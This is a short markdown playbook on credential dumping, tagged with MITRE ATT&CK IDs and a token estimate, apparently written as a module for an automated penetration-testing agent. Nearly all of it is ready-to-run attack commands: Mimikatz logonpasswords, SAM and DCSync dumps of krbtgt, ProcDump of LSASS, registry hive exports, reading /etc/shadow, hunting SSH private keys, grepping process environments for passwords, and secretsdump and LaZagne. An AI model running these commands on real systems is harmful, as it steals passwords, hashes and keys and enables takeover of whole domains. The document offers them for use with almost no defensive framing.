---
title: Credential Dumping
category: credential_access
applicable_techniques:
  - T1003
  - T1003.001
  - T1003.002
  - T1003.003
mitre_tactics:
  - TA0006
max_token_estimate: 700
---

## Attack Methodology

1. **LSASS Memory (T1003.001)**: Dump LSASS process memory to extract NTLM hashes and Kerberos tickets.
2. **SAM Database (T1003.002)**: Extract local account hashes from SAM registry hive.
3. **NTDS.dit (T1003.003)**: Extract domain credentials from Active Directory database.
4. **Linux Credentials**: `/etc/shadow`, SSH keys in `~/.ssh/`, credential files, bash history.

## Techniques by Platform

### Windows
- Mimikatz: `sekurlsa::logonpasswords`, `lsadump::sam`, `lsadump::dcsync`
- ProcDump: `procdump -ma lsass.exe lsass.dmp` (LOLBIN-based)
- Registry: `reg save HKLM\SAM sam.hiv`, `reg save HKLM\SYSTEM system.hiv`
- DCSync: `lsadump::dcsync /domain:corp.local /user:krbtgt`

### Linux
- Shadow: `cat /etc/shadow` (requires root)
- SSH keys: `find / -name id_rsa 2>/dev/null`
- Memory: `strings /proc/*/environ 2>/dev/null | grep -i pass`

## Tool Usage Tips

- Impacket secretsdump: `secretsdump.py domain/user:pass@dc_ip`
- LaZagne: `lazagne.exe all`
- Mimikatz: `privilege::debug` → `sekurlsa::logonpasswords`
